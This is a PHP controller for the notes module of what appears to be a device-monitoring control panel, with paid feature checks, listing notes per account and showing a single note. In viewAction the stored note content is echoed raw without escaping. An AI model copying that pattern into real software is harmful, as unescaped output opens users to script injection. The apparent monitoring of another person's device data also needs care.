<?php

namespace Controllers;

use System\FlashMessages,
    Models\Modules,
    CS\Devices\Limitations;

class Notes extends BaseModuleController
{

    protected $module = Modules::NOTES;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
        $notesModels = new \Models\Cp\Notes($this->di);

        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            $data = $notesModels->getDataTableData(
                    $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
            );
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            $accounts = $notesModels->getAccountsList($this->di['devId']);

            $this->view->accountsList = $accounts;
            $this->view->hasRecords = (count($accounts) > 0);
        }
        
        $this->setView('cp/notes/index.htm');
    }

    public function viewAction()
    {
        $notesModels = new \Models\Cp\Notes($this->di);

        if ($this->getRequest()->get('content') !== null) {
            if (($value = $notesModels->getContent($this->di['devId'], $this->params['account'], $this->params['timestamp'])) !== false) {
                echo $value;
                die;
            } else {
                $this->error404();
            }
        }
        
        if (($noteData = $notesModels->getNote($this->di['devId'], $this->params['account'], $this->params['timestamp'])) == false) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('Record not found!'));
            $this->redirect($this->di['router']->getRouteUrl('notes'));
        }

        $this->view->note = $noteData;
        $this->view->account = $this->params['account'];
        $this->setView('cp/notes/view.htm');
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Notes');

        if($this->di['currentDevice']['os'] != 'icloud'){
            $this->view->customTimezoneOffset = 0;
        }
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::NOTES);
    }

}
